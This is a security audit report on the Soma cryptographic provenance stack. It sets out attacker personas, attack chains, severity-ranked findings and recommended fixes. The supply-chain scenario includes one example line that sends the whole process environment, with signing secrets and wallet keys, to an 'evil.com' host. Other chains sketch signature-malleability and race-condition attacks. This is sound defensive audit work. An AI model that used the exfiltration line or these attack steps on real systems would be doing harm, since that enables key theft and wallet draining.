# Soma Security Audit — Adversarial Analysis

**Date:** 2026-04-07
**Scope:** Full Soma stack — soma-heart, birth certificates, dual-sign, receipts, EAS anchoring, merkle trees, trust scoring, middleware, key management, sense-observer
**Method:** Code-level audit + external research (40+ academic papers, CVEs, production incidents)
**Files audited:** 50+ across src/core/, src/middleware/, src/routes/, src/utils/, src/db/, packages/sense-observer/, node_modules/soma-heart/

---

## Executive Summary

**22 findings total:** 4 Critical, 7 High, 8 Medium, 3 Low

The Soma cryptographic architecture is fundamentally sound — Ed25519 with HKDF domain separation, JCS canonicalization, merkle anchoring. The serious vulnerabilities are not in the crypto primitives but in the **plumbing**: race conditions in singleton state, inconsistent encoding between modules, a fire-and-forget receipt system that can silently fail, and a dual-sign path that blesses unverified provider data with a valid platform signature.

The single most dangerous finding is the **module-level provenance state race condition** — under concurrent load, Request A can receive Request B's birth certificate. This is acknowledged as a "Phase 1 shortcut" in code comments but remains unfixed in production.

---

## Part 1: Hacker Personas & Attack Chains

### Persona A: The Script Kiddie (external, no access, wants free API calls)

**What they'd try:**
1. Replay captured birth certificates to fake data provenance
2. Brute-force API key format (`cn-[a-f0-9]{48}`)
3. Enumerate receipts/verdicts via public endpoints
4. Rate limit bypass via IP spoofing

**Attack chain A1: Receipt Enumeration**
- `GET /v1/soma/receipt/:id` is public, no auth, no rate limit
- Receipt IDs are `sr-<uuid>` (unguessable) — SAFE
- BUT `getSomaReceiptByRequestId` fallback accepts request IDs like `vfy-<nanoid12>` — 12-char nanoid has ~71 bits of entropy — SAFE but shorter namespace than UUIDs
- `GET /v1/soma/:did/verdicts` has no rate limit — can enumerate all verdicts for any DID
- **Impact:** Information disclosure (trust scores, verdict history)
- **Fix:** Rate-limit verdict/receipt endpoints

**Attack chain A2: API Key Brute-Force**
- Format `cn-[a-f0-9]{48}` = 48 hex chars = 192 bits of entropy
- At 1000 attempts/second, exhaustion takes 10^49 years — **NOT FEASIBLE**
- Rate limiting at auth layer provides additional defense
- **Status:** SAFE

### Persona B: The Malicious Provider (has API access, registered provider)

**What they'd try:**
1. Forge birth certificates to claim they computed something they didn't
2. Inject false dual-sign data to get platform co-signature
3. Game the trust/reputation system
4. Manipulate Soma Check to earn undeserved credits

**Attack chain B1: Platform Blesses Forged Provider Cert** -- CRITICAL
```
1. Malicious provider sends response with X-Soma-* headers containing:
   - X-Soma-Data-Hash: <hash of data they didn't actually compute>
   - X-Soma-Signature: <valid sig from a different, expired cert>
   - X-Soma-Public-Key: <their real key>
2. dual-sign.ts extractProviderCert() extracts these headers
3. verifyProviderCert() checks sig against claimed public key
   - If the sig IS valid for that key+hash: providerVerified=true
   - If not: providerVerified=false
4. EITHER WAY: createDualSign() proceeds and the platform co-signs
5. The response goes out with X-Soma-Dual-Signed: true
6. A consumer checking only the platform signature treats it as verified
```
- **Root cause:** `dual-sign.ts` line ~147 — platform signs regardless of provider verification result
- **Impact:** Unverified provider data gets platform's Ed25519 blessing
- **Severity:** CRITICAL
- **Fix:** REFUSE to co-sign when `providerVerified=false`. Return single-sign (platform-only) instead.

**Attack chain B2: Trust Score Manipulation**
```
1. Provider makes 1000 cheap legitimate calls over 90 days
2. Trust score saturates (vouch-ranking.ts tenure cap at 90 days)
3. Provider now has high trust, low bond requirements
4. Submits one high-value fraudulent computation
5. Extracts value > accumulated reputation cost
```
- **Root cause:** No value-tier gating, no anomaly detection
- **Impact:** High-value fraud after reputation buildup
- **Severity:** HIGH (addressed in fraud-proofs v2 doc, not yet built)

### Persona C: The Sophisticated Attacker (network position, can intercept traffic)

**What they'd try:**
1. Man-in-the-middle between ClawNet and upstream providers
2. Replay signed responses indefinitely
3. Exploit encoding inconsistencies to forge cross-module artifacts
4. Exploit the race condition to swap birth certs between requests

**Attack chain C1: Birth Cert Cross-Contamination** -- CRITICAL
```
1. Attacker sends two rapid concurrent requests:
   - Request A: calls expensive endpoint (10 credits)
   - Request B: calls cheap endpoint (0.5 credits)
2. Single-process Node.js handles both asynchronously
3. clawApiCall() for Request A completes, sets _lastBirthCert = certA
4. clawApiCall() for Request B completes, overwrites _lastBirthCert = certB
5. soma-provenance middleware for Request A reads _lastBirthCert → gets certB
6. Request A's response has Request B's birth certificate headers
7. Request A's receipt (soma-receipt.ts) records certB's data hash
```
- **Root cause:** Module-level mutable singletons: `_lastBirthCert`, `_lastDualSignResult`, `_lastGenerationProvenance`
- **Files:** `src/providers/clawapis.ts:50`, `src/core/dual-sign-state.ts`, `src/core/soma.ts:36`
- **Impact:** Wrong provenance on responses, incorrect receipts, broken audit trail
- **Severity:** CRITICAL
- **Fix:** Replace all module-level singletons with AsyncLocalStorage or Hono `c.set()`/`c.get()` request-scoped context.

**Attack chain C2: Response Replay (No Expiry Window)**
```
1. Attacker captures a signed response:
   X-ClawNet-Signature: t=1712505600,v1=<hmac>
2. Replays the response to a different consumer weeks later
3. Consumer verifies HMAC — valid
4. Consumer has no guidance on max-age for the timestamp
5. Stale/outdated data accepted as fresh
```
- **Root cause:** `sign-response.ts` includes timestamp but no documented/enforced expiry window
- **Impact:** Stale data accepted as legitimate
- **Severity:** HIGH
- **Fix:** Document max-age recommendation (5 minutes). Optionally add `X-ClawNet-Signature-Expires` header.

**Attack chain C3: Encoding Confusion Attack**
```
1. Attacker observes that dual-sign.ts encodes public keys as hex
2. Attacker observes that soma routes verify mode uses base58btc
3. Attacker submits a provider cert where:
   - Public key is valid base58btc but interpreted as hex by dual-sign
   - Buffer.from(key, 'hex') silently produces garbled bytes
   - Verification fails but platform still co-signs (providerVerified=false)
4. Or reversed: attacker provides hex-encoded sig where base58btc is expected
   - base58btcDecode produces wrong bytes, verification fails silently
```
- **Root cause:** Inconsistent encoding across modules (hex, base64, base58btc)
- **Files:** `dual-sign.ts` (hex), `cache-certificate.ts` (base64), `routes/soma.ts` (base58btc)
- **Impact:** Verification bypass via encoding confusion
- **Severity:** HIGH
- **Fix:** Establish ONE canonical encoding (hex for signatures/hashes, base58btc for public keys) and enforce via a shared validation function.

### Persona D: The Insider / Compromised Dependency (has code execution)

**What they'd try:**
1. Exfiltrate PLATFORM_SIGNING_SECRET from process.env
2. Forge birth certificates, receipts, EAS attestations
3. Drain Solana/EVM wallets
4. Plant backdoor in crypto path

**Attack chain D1: Supply Chain Key Theft** -- CRITICAL
```
1. Malicious npm package (or compromised dependency update) executes:
   fetch('https://evil.com/?' + btoa(JSON.stringify(process.env)))
2. Attacker receives:
   - PLATFORM_SIGNING_SECRET → can derive ALL Ed25519 + ML-DSA keys
   - SOLANA_PRIVATE_KEY → drain Solana wallet
   - EVM_PRIVATE_KEY → drain Base wallet, forge EAS attestations
   - HOT_WALLET_POOL → drain all hot wallets
3. Attacker can now:
   - Sign arbitrary birth certificates
   - Forge receipts
   - Create fake EAS attestations
   - Co-sign fake dual-sign certs
   - Sign fake response HMACs
   Total control of all cryptographic operations.
```
- **Root cause:** All secrets in env vars, accessible to any code in the process
- **Impact:** Complete cryptographic compromise
- **Severity:** CRITICAL (but this is a systemic Node.js/VPS risk, not Soma-specific)
- **Mitigations:**
  - `npm audit` in CI (not currently present)
  - Socket.dev or Snyk for supply chain monitoring
  - Pin exact dependency versions (package-lock.json exists — good)
  - Consider file-based secrets (read from file, not env var) for the most critical keys
  - Restrict VPS user permissions so `/proc/self/environ` is protected

**Attack chain D2: HMAC → Ed25519 Key Derivation Chain**
```
1. sign-response.ts uses PLATFORM_SIGNING_SECRET directly as HMAC key
2. HKDF derives Ed25519 seed from the same secret (with domain separation)
3. If HMAC output somehow leaks info about the secret (theoretical):
   - Attacker could derive Ed25519 private key
4. HMAC-SHA256 is a PRF — this is theoretically safe
5. But: using raw secret for HMAC means NO domain separation on that path
```
- **Root cause:** `sign-response.ts` uses raw `PLATFORM_SIGNING_SECRET` for HMAC, while Ed25519 uses HKDF-derived key from the same secret
- **Impact:** Low probability but violates cryptographic hygiene (key separation)
- **Severity:** MEDIUM
- **Fix:** Derive HMAC key via `hkdfSync('sha256', secret, '', 'clawnet:hmac-response:v1', 32)`

### Persona E: The State Actor / Academic Researcher (unlimited resources, looking for protocol flaws)

**What they'd try:**
1. TweetNaCl signature malleability
2. JCS canonicalization differentials
3. Merkle tree structural attacks
4. Cryptographic downgrade attacks

**Attack chain E1: Signature Malleability (TweetNaCl)**
```
1. Attacker intercepts a valid birth certificate with signature (R, S)
2. TweetNaCl does NOT check S < L (group order)
3. Attacker computes S' = S + L (still reduces to same scalar mod L)
4. New signature (R, S') also passes nacl.sign.detached.verify()
5. Two "different" signatures for the same data exist
6. If signatures are used as dedup keys, this creates duplicates
7. If providerSignature is stored in receipts, two receipts could exist
   for the "same" interaction with different signatures
```
- **Root cause:** TweetNaCl v1.0.3 does not enforce canonical S (RFC 8032 §5.1.7)
- **Files:** `packages/sense-observer/src/index.ts`, `src/core/dual-sign.ts`
- **Impact:** Signature duplication (not forgery — cannot sign new messages)
- **Severity:** MEDIUM (no current code path uses signatures as primary keys)
- **Fix:** Replace TweetNaCl verification with Node.js native `crypto.verify('ed25519', ...)` which enforces S < L. Or add explicit S < L check.

**Attack chain E2: Chain Verifier Incompatibility**
```
1. soma-heart links parent certs via: sha256(parentCert.receiverSignature)
2. sense-observer links parent certs via: parentCert.dataHash
3. A chain of 3 certs: C1 → C2 → C3
4. soma-heart says: C2.parentCertificates = [sha256(C1.receiverSignature)]
5. sense-observer checks: C2.parentCertificates.includes(C1.dataHash)
6. These are DIFFERENT values — verification FAILS
7. A legitimate chain verified by soma-heart is rejected by sense-observer
```
- **Root cause:** Two independent implementations of chain verification with different linking mechanisms
- **Impact:** Interoperability failure — external verifiers reject valid chains
- **Severity:** HIGH
- **Fix:** Align both implementations on one linking mechanism. Since soma-heart is the authoritative signer, sense-observer should match its convention.

**Attack chain E3: Colon Delimiter Injection in Chain Hash**
```
1. dual-sign.ts builds chain hash payload:
   `${providerDataHash}:${providerSig}:${providerPubKey}:${platformDataHash}:${heartbeatIdx}`
2. If providerDataHash contains a colon (shouldn't in hex, but no validation):
   providerDataHash = "abc:def"
3. Payload becomes: "abc:def:<sig>:<key>:<hash>:<idx>"
4. Parser splitting on ":" sees 6 fields instead of 5
5. Field boundaries shift — different data maps to different fields
```
- **Root cause:** Colon-delimited string concatenation without field validation or length-prefixing
- **Impact:** Theoretical chain hash collision/manipulation
- **Severity:** LOW (hex encoding shouldn't contain colons, but no enforcement)
- **Fix:** Validate all fields are hex before concatenation, or use JCS/structured format.

---

## Part 2: All Findings — Ordered by Severity

### CRITICAL (4)

| # | Finding | File(s) | Impact |
|---|---------|---------|--------|
| C1 | **Module-level provenance race condition** — concurrent requests can swap birth certs | `clawapis.ts:50`, `dual-sign-state.ts`, `soma.ts:36`, `soma-provenance.ts` | Wrong provenance on responses, corrupted receipts |
| C2 | **Platform co-signs unverified provider certs** — providerVerified=false is advisory only | `dual-sign.ts:147` | Consumers trusting platform signature accept forged provider data |
| C3 | **Supply chain key theft** — all secrets in process.env, accessible to any dependency | `config/index.ts`, `.env` | Total cryptographic compromise |
| C4 | **Receipt creation is fire-and-forget** — paid interactions can have no proof | `soma-receipt.ts:283` | User pays, gets null receipt, no recourse |

### HIGH (7)

| # | Finding | File(s) | Impact |
|---|---------|---------|--------|
| H1 | **Response replay — no expiry window** on X-ClawNet-Signature timestamps | `sign-response.ts` | Stale data replayed indefinitely |
| H2 | **Encoding inconsistency** — hex vs base64 vs base58btc across modules | `dual-sign.ts`, `cache-certificate.ts`, `routes/soma.ts` | Cross-module verification failures, confusion attacks |
| H3 | **Chain verifier incompatibility** — sense-observer vs soma-heart use different parent linking | `sense-observer/index.ts`, `soma-heart/birth-certificate.js` | External verifiers reject valid chains |
| H4 | **Verdict route has no schema validation** — raw c.req.json() without Zod | `routes/soma.ts:93` | Malformed payloads cause unexpected behavior |
| H5 | **CredentialVault key derivation lacks domain separation** — SHA-256(secret) with no label | `soma-heart/credential-vault.js` | Signing key compromise = vault compromise |
| H6 | **Receipt hash falls back to requestId** when request/response data not provided | `soma-receipt.ts:142` | Receipt hash doesn't bind to actual content |
| H7 | **No rate limit on verdict/receipt enumeration endpoints** | `routes/soma.ts:250,362` | Information disclosure, trust score enumeration |

### MEDIUM (8)

| # | Finding | File(s) | Impact |
|---|---------|---------|--------|
| M1 | **TweetNaCl signature malleability** — S not checked < L | `sense-observer`, `dual-sign.ts` | Signature duplication (not forgery) |
| M2 | **HMAC uses raw PLATFORM_SIGNING_SECRET** — no domain separation from Ed25519 path | `sign-response.ts:28` | Crypto hygiene violation |
| M3 | **EAS revocation not checked** during verification | `utils/eas.ts:238` | Revoked receipts still accepted |
| M4 | **Custom JCS implementation** — no RFC 8785 test vectors, lone surrogate issue | `utils/jcs.ts` | Cross-platform verification failures |
| M5 | **trust-scoring-v2 uses JSON.stringify** for proofHash (not JCS) | `core/trust-scoring-v2.ts:246` | Non-canonical hash depends on insertion order |
| M6 | **`cached` field hardcoded to false** on receipt read — stored value ignored | `soma-receipt.ts:314` | Receipts always report non-cached |
| M7 | **Buffer.from(hex) silent truncation** — non-hex input produces garbled bytes | `dual-sign.ts:98` | Verification on garbled data instead of clean failure |
| M8 | **Intent declaration passed unescaped** to HTTP header | `utils/billing.ts:55` | Potential CRLF header injection |

### LOW (3)

| # | Finding | File(s) | Impact |
|---|---------|---------|--------|
| L1 | **Colon-delimited chain hash** — no field validation | `dual-sign.ts:160` | Theoretical delimiter injection |
| L2 | **HKDF uses empty salt** — valid per RFC 5869 but random salt is stronger | `ed25519-signer.ts:56` | Marginally weaker key derivation |
| L3 | **Vouch ranking cascade logic** — somaCheckTier >= 3 overwrites even if verified=false | `vouch-ranking.ts:71` | Unverified provider gets highest bonus |

---

## Part 3: What Soma Gets RIGHT (Credit Where Due)

These are security properties that are **correctly implemented** and should be preserved:

| Property | Implementation | Assessment |
|---|---|---|
| Ed25519 with HKDF domain separation | `ed25519-signer.ts` — separate domains for Ed25519 and ML-DSA | GOOD |
| Timing-safe API key comparison | `auth.ts` — `crypto.timingSafeEqual` | GOOD |
| Merkle tree second-preimage prevention | `merkle-anchor.ts` — odd-element promotion, not duplication | GOOD |
| JCS canonicalization before signing | `jcs.ts` + all signing paths use it | GOOD (needs test vectors) |
| Hybrid Ed25519 + ML-DSA-65 (post-quantum) | `ed25519-signer.ts` — both must pass for hybrid verify | GOOD |
| API key hashing in receipts | `soma-receipt.ts` — `somaHash(apiKey)` before storage | GOOD |
| Dev-only fallback key with warning | `ed25519-signer.ts` — production throws if secret missing | GOOD |
| CredentialVault encrypt-at-rest with XSalsa20 | `soma-heart/credential-vault.js` — destroy() zeros key | GOOD |
| Timing-safe HMAC verification in soma-heart | `soma-heart/crypto-provider.js` — `timingSafeEqual` | GOOD |
| Channel handshake verifies genome before key exchange | `soma-heart/channel.js` | GOOD |
| HMAC key has domain separation from session key | `soma-heart/seed.js` — `"|soma:hmac"` suffix | GOOD |
| Deterministic Ed25519 nonces (no nonce reuse risk) | Ed25519 spec: `H(secret_key \|\| message)` | GOOD |
| Credits cannot go negative (DB trigger) | `connection.ts` — `trg_credits_non_negative` | GOOD |
| Self-verdicts rejected | `routes/soma.ts:133` | GOOD |
| Verdict submission requires valid Ed25519 signature | `routes/soma.ts` — `verifyVerdictSignature()` | GOOD |

---

## Part 4: Recommended Fix Priority

### Immediate (before next deploy)

**1. Fix the race condition (C1)**
Replace all module-level singletons with request-scoped context:
```typescript
// Instead of module-level _lastBirthCert:
// In the provider call:
c.set('birthCert', result.birthCertificate);
// In the middleware:
const cert = c.get('birthCert');
```
Files to change: `clawapis.ts`, `dual-sign-state.ts`, `soma.ts`, `soma-provenance.ts`

**2. Stop co-signing unverified provider certs (C2)**
In `dual-sign.ts`, when `providerVerified === false`, return `null` instead of a dual-sign result. The middleware already handles null (falls back to single-sign). This is a one-line change.

**3. Add rate limits to public Soma endpoints (H7)**
Apply the existing `rateLimiter` middleware to `/:did/verdicts`, `/:did/trust`, and `/receipt/:id`.

### Short-term (this week)

**4. Add Zod schema validation to verdict submission (H4)**
The verify route already uses Zod — copy the pattern to the verdict POST route.

**5. Fix encoding inconsistency (H2)**
Create `src/utils/encoding.ts` with:
- `encodePublicKey(bytes): string` — always base58btc for public keys
- `encodeSignature(bytes): string` — always hex for signatures
- `encodeHash(bytes): string` — always hex for hashes
- `decodePublicKey(str): Uint8Array` — validates format
- `decodeSignature(str): Uint8Array` — validates format, checks length

**6. Derive HMAC key via HKDF (M2)**
In `sign-response.ts`, replace raw `PLATFORM_SIGNING_SECRET` usage:
```typescript
const hmacKey = hkdfSync('sha256', secret, '', 'clawnet:hmac-response:v1', 32);
```

**7. Add receipt creation retry / error propagation (C4)**
Make `createSomaReceipt` return an error indicator to the route handler. If receipt fails, add `X-Soma-Receipt-Status: failed` header so the consumer knows.

**8. Validate hex input in dual-sign verification (M7)**
Before `Buffer.from(cert.dataHash, 'hex')`, validate: `/^[0-9a-f]{64}$/.test(cert.dataHash)`

### Medium-term (this month)

**9. Add npm audit to CI / deploy pipeline**
Add `npm audit --audit-level=high` to the build step. Consider Socket.dev for runtime supply chain monitoring.

**10. Document response signature max-age (H1)**
Add `X-ClawNet-Signature-Expires` header (current time + 5 minutes). Document in API docs that signatures older than 5 minutes should be treated as stale.

**11. Align chain verification (H3)**
Update sense-observer to use `sha256(cert.receiverSignature)` as parent link, matching soma-heart's convention. Publish updated package.

**12. Add RFC 8785 test vectors to JCS (M4)**
Import test vectors from RFC 8785 Appendix B into a unit test.

**13. Replace TweetNaCl verify with Node native crypto (M1)**
In sense-observer and dual-sign.ts, replace:
```typescript
// Before:
nacl.sign.detached.verify(message, signature, publicKey)
// After:
crypto.verify('ed25519', message, { key: publicKey, format: 'raw', type: 'public' }, signature)
```

**14. Fix receipt hash fallback (H6)**
When request/response data is not provided, hash `requestId + timestamp + endpointId` instead of just requestId. This at least binds the receipt to a specific time and endpoint.

**15. Fix trust-scoring proofHash (M5)**
Replace `JSON.stringify` with `jcsSerialize` for canonical hashing.

**16. Add EAS revocation check (M3)**
In `verifyOffchainReceipt()`, query on-chain revocation status before returning valid.

**17. Fix cached field on receipt read (M6)**
Replace hardcoded `false` with `row.cached` from DB.

### Long-term (tracked but not blocking)

**18. Consider file-based secrets for critical keys**
Read PLATFORM_SIGNING_SECRET, SOLANA_PRIVATE_KEY, EVM_PRIVATE_KEY from files instead of env vars. This prevents `/proc/self/environ` exposure and limits supply chain exfiltration to `fs.readFile` which is more auditable than `process.env` access.

**19. Sanitize intent_declaration header value (M8)**
Strip CRLF and non-ASCII from delegation intent before setting as header.

**20. Fix vouch ranking cascade (L3)**
Make soma bonus conditions mutually exclusive with clear priority.

---

## Part 5: What's NOT Vulnerable (Explicitly Cleared)

| Concern | Status | Why |
|---|---|---|
| API key brute-force | SAFE | 192-bit entropy, rate-limited |
| HMAC length extension | SAFE | HMAC construction prevents it |
| Merkle second-preimage | SAFE | Odd-element promotion, fixed-length leaves |
| Ed25519 nonce reuse | SAFE | Deterministic nonces by spec |
| SQL injection via verdicts | SAFE | Parameterized queries throughout |
| Ed25519 cofactor attack | SAFE | Not accepting arbitrary public keys for signing |
| Ed25519 fault injection | SAFE | Requires physical VPS access |
| Birth cert time manipulation | SAFE | NTP drift <100ms, sense-observer rejects >60s future |
| Key derivation related-key | SAFE | HKDF domain separation is correct |
| Merkle empty tree | SAFE | Deterministic empty hash, no security impact |
| EAS schema manipulation | SAFE | One-time registration, env var reference |

---

## Part 6: Comparison to Industry

| Property | ClawNet/Soma | Arbitrum BOLD | TrueBit | Industry Standard |
|---|---|---|---|---|
| Signature scheme | Ed25519 + ML-DSA-65 (hybrid PQ) | ECDSA (secp256k1) | ECDSA | ClawNet is ahead (PQ-ready) |
| Key derivation | HKDF-SHA256 with domain separation | N/A (wallet keys) | N/A | GOOD |
| Canonicalization | JCS (RFC 8785) | EVM ABI encoding | N/A | GOOD |
| On-chain anchoring | EAS on Base + Merkle on Solana | Native L1 | Ethereum L1 | GOOD (dual-chain) |
| Timing-safe comparison | Yes (auth, HMAC) | Yes (smart contracts) | N/A | GOOD |
| Post-quantum readiness | ML-DSA-65 (FIPS 204) | None | None | AHEAD of industry |
| Request-scoped state | Module-level singletons (BROKEN) | N/A (stateless contracts) | N/A | MUST FIX |
| Supply chain protection | package-lock.json only | N/A | N/A | BELOW industry (needs audit CI) |

---

## Appendix: Attack Surface Map

```
                    EXTERNAL
                       |
                       v
              +-----------------+
              |   Hono Router   |
              | rate-limit.ts   | <-- IP spoofing (mitigated)
              | auth.ts         | <-- key brute-force (safe), timing (safe)
              +-----------------+
                       |
         +-------------+-------------+
         |             |             |
         v             v             v
   endpoints.ts    soma.ts     soma-demo.ts
   (call flow)    (verdicts)   (test harness)
         |             |
         v             v
   clawapis.ts    verifyVerdictSignature()
   (upstream)      (Ed25519 verify)
         |
         v
   +-------------------+
   | _lastBirthCert    | <-- RACE CONDITION (C1)
   | _lastDualSign     |
   | _lastGenProv      |
   +-------------------+
         |
         v
   dual-sign.ts ---------> signs even when unverified (C2)
         |
         v
   soma-receipt.ts -------> fire-and-forget (C4)
         |                   falls back to requestId hash (H6)
         v
   eas.ts + eas-anchor-cron.ts --> no revocation check (M3)
         |
         v
   merkle-anchor.ts ------> SAFE (second-preimage mitigated)
         |
         v
   soma-anchor-cron.ts ---> Solana memo anchor (SAFE)

   sign-response.ts ------> raw secret for HMAC (M2)
                             no replay window (H1)

   ed25519-signer.ts -----> HKDF domain separation (GOOD)
                             hybrid PQ signing (GOOD)

   sense-observer/ --------> TweetNaCl malleability (M1)
                             chain verifier mismatch (H3)

   process.env ------------> all secrets accessible (C3)
```
